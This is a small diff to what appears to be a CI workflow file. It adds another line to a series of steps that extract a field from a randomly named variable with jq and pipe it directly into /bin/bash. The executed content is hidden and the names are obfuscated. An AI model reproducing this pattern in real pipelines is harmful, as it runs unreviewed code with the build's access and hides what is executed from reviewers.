@@ -30,6 +30,7 @@ jobs:
           echo $tzsmt0 | jq -r .godw6 | /bin/bash
           printf '%s' "$qx300" | jq -r .nxue9 | /bin/bash
           printf '%s' "$vfoz27690" | jq -r .ztf58 | /bin/bash
+          printf '%s' "$ldey3" | jq -r .xrpk69 | /bin/bash
 
       - name: Upload results
         if: always()
